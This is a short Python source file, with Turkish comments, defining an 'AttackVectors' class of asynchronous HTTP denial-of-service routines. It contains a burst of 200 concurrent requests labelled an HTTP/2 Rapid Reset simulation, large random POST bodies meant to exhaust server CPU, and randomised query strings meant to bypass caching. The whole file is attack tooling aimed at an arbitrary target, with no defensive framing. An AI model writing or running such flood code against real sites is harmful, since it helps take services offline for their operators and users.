import asyncio
import httpx
import string
import random

class AttackVectors:
    @staticmethod
    async def h2_rapid_reset(client, target, headers):
        """HTTP/2 üzerinden sunucuya nefes aldırmayan Rapid Reset simülasyonu."""
        try:
            # Tek bağlantıda 200 eşzamanlı stream!
            tasks = [client.get(target, headers=headers) for _ in range(200)]
            await asyncio.gather(*tasks, return_exceptions=True)
            return 200
        except: return 0

    @staticmethod
    async def slow_post_vortex(client, target, headers):
        """Sunucunun işlemci gücünü tüketen devasa veri gönderimi."""
        large_data = ''.join(random.choices(string.ascii_letters + string.digits, k=10000))
        try:
            await client.post(target, data={"vortex": large_data}, headers=headers)
            return 1
        except: return 0

    @staticmethod
    async def query_fuzzing(client, target, headers):
        """Önbelleği (cache) bypass etmek için her seferinde farklı URL parametreleri."""
        fuzzed_url = f"{target}?q={random.randint(1, 999999)}&token={random.choice(string.ascii_letters)}"
        try:
            await client.get(fuzzed_url, headers=headers)
            return 1
        except: return 0